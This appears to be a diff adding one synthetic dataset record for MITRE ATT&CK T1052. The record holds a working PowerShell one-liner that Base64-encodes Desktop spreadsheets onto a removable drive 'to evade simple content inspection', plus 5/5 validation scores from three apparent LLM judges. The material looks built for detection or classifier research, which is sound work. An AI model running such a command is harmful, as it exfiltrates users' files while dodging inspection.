@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest=\"$dl`:\\cache\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; Get-ChildItem \"$env:USERPROFILE\\Desktop\" -Include *.xlsx,*.csv -Recurse -ErrorAction SilentlyContinue | ForEach-Object { $b=[IO.File]::ReadAllBytes($_.FullName); [Convert]::ToBase64String($b) | Set-Content -Path (Join-Path $dest ($_.BaseName + \".b64\")) -Encoding ascii }; Write-Output \"Base64-archived Desktop data to $dest at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append",
+  "explanation": "Base64-encodes spreadsheet data and stores it on a removable drive to evade simple content inspection while keeping all operations local.",
+  "rationale_steps": [
+    "Locate a removable drive for staging",
+    "Enumerate spreadsheet files from the Desktop",
+    "Read bytes and encode data to Base64 before writing to USB",
+    "Log the local operation using Write-Output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-9ff91ae3",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced delimiters, valid cmdlets/parameters (e.g., Select -First -Expand for DriveLetter), proper separators, and correct escaping to construct the removable drive path.",
+        "semantic_score": 5,
+        "semantic_justification": "It identifies a removable drive, creates a staging directory, base64-encodes Desktop spreadsheet files, writes them to the removable media, and logs the action—consistent with T1052 exfiltration over physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.94,
+        "timestamp": "2025-10-01T06:59:37.290309Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced parentheses, proper semicolon separators, valid cmdlet syntax, correct backtick escaping in the path string, and no structural errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1052 by detecting a removable drive, staging a hidden-looking 'cache' directory, recursively collecting spreadsheet files from the Desktop, Base64-encoding them to evade content inspection, writing them to the removable medium, and logging the operation — all consistent with physical medium exfiltration tradecraft.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:31:24.252271Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid PowerShell syntax, properly handles variable interpolation, and uses correct cmdlets and .NET methods.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately identifies a removable drive, performs data staging with Base64 encoding to evade inspection, and transfers the files to the physical medium as described in T1052.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:31:33.405829Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
